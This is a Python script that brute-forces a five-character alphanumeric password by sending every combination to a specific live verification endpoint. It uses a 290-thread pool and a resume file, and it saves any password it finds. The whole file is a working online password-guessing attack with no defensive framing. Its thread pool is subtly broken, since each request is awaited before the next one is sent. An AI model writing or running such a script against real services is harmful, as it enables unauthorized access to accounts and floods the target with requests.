import requests
import string
from itertools import product
from concurrent.futures import ThreadPoolExecutor

# API URL
url = "https://secret.corgi.insure/api/verify-password"

# Characters to try: uppercase A-Z and digits 0-9
characters = string.ascii_uppercase + string.digits

# File to save the last tried password
last_password_file = "last_password.txt"

found_password_file = "found_password.txt"


# Function to save the last tried password
def save_last_password(password):
    with open(last_password_file, "w") as file:
        file.write(password)

def save_found_password(password):
    with open(found_password_file, "w") as file:
        file.write(password)

# Function to load the last tried password
def load_last_password():
    try:
        with open(last_password_file, "r") as file:
            return file.read().strip()
    except FileNotFoundError:
        return "AACZT"  # Start point if no file exists

# Function to make a request
def try_password(password):
    payload = {"password": password}
    response = requests.post(url, json=payload)

    if response.status_code == 200 and response.json().get("success", False):
        print(f"Password found: {password}")
        save_found_password(password)
        return True
    else:
        save_last_password(password)
        return False

# Main brute force function with parallelization
def brute_force_password():
    last_password = load_last_password()
    found_start = False

    # Using ThreadPoolExecutor for parallel requests
    with ThreadPoolExecutor(max_workers=290) as executor:  # Adjust the number of workers as needed
        # Generate all combinations of 5 characters
        for combo in product(characters, repeat=5):
            password = ''.join(combo)
            
            # Skip to the saved last password
            if not found_start:
                if password == last_password:
                    found_start = True
                continue

            # Submit the password check to the executor
            future = executor.submit(try_password, password)
            if future.result():
                print("Stopping further attempts.")
                return

    print("Password not found.")

# Run the script
brute_force_password()
